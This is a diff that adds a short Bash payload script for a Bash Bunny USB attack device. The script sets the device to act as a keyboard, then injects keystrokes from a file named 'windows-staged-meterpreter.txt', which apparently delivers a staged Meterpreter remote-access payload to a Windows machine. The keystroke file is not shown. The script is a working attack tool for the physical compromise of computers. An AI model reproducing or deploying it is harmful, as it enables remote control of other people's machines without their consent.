@@ -1,0 +1,18 @@
+#!/bin/bash
+
+ATTACKMODE HID
+
+LED G B 200
+
+LANGUAGE='us'
+
+source bunny_helpers.sh
+
+if [ -f "/root/udisk/payloads/${SWITCH_POSITION}/ducky.txt" ]; then
+        QUACK ${SWITCH_POSITION}/windows-staged-meterpreter.txt
+        LED G
+else
+    LED R 
+    echo "Unable to load ducky.txt" >> /root/debuglog.txt
+        exit 1
+fi
